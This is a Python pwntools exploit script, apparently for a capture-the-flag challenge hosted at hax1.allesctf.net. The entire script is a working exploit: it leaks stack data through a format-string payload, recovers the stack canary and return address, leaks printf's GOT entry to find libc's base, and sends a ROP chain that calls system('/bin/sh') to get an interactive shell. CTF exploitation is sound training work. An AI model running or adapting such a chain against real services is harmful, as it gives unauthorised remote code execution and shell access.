from pwn import *


#p = process("./pwn3")
p = remote("hax1.allesctf.net",9102)



print(p.readline())

p.sendline(b"CSCG{NOW_GET_VOLDEMORT}")
#p.sendline(b"CSCG{THIS_IS_TEST_FLAG}")


print(p.readline())
p.sendline("|".join(["%p"]*85))
p.readline()
p.readline()
p.readline()
leaks = p.readline().decode("utf-8").split("|")

input()
cannery = p64(int(leaks[38],16))

leak_ret = int(leaks[40],16)
printf_got = leak_ret + 0x20121a

welcome =  leak_ret - 0x14f
ret =      leak_ret -  0x38
pop_rdi =  leak_ret +  0x75
AAAAAAAA = leak_ret -  0xc6

print(f"leaked ret : {hex(leak_ret)}")
print(f"printf {hex(printf_got)}")

#First rip control. Ropchain <welcome><AAAAAAAA>
p.sendline(b"Expelliarmus\0" +  b"A" * cyclic_find(b"cnaa") + cannery + p64(ret) + p64(ret) + p64(welcome) + p64(AAAAAAAA))

print(p.readline())
print(p.readline())

# Format string exploit again: we use `%s` to get the data at the address `printf_got`
p.sendline(b"%7$s" + b"\0" * 4 +  p64(printf_got))


print(p.readline())
print(p.readline())
p.readline()
printf = int.from_bytes(p.read(6), "little")

libc_base = printf - 0x0000000000064d70

system = libc_base + 0x00000000000554e0
bin_sh = libc_base + 0x1b6613

print(hex(printf))
print(hex(system))
print(hex(bin_sh))
print(hex(pop_rdi))
print(p.readline())

# Second ropchain `<pop_rdi><addr of binsh><system>` a lot of `ret`s to align the stack
p.sendline(b"Expelliarmus\0" +  b"A" * cyclic_find(b"cnaa") + cannery + p64(ret)+ p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(ret) +p64(ret)+p64(ret) + p64(system))

p.interactive()
